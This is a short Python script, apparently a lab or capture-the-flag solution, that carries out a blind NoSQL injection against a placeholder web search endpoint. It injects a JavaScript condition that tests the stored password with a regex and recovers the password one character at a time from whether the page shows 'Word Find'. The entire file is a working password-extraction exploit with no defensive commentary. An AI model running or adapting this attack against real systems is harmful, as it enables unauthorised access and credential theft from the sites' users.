
from urllib.request import urlopen
letter = [5,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','-',0,
1,2,3,4,6,7,8,9,5,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','-',0,1,2,3,4,6,7,8,9]
key=[]
def main():
	n=0
	for y in range(len(letter)):
		while n != 1:
			for x in letter:
				key.extend([x,'.*'])
				n=request()
				if n != 1:
					key.pop()
				key.pop()
				n=request()
	print(''.join(map(str,key)))

def request():
	url = "<domain>?search=ABC'%20%26%26%20this.password.match(/^"+''.join(map(str,key))+"$/)%00"
	page = urlopen(url)
	html = str(page.read())
	if html.find("Word Find") >= 0:
		return 1

main()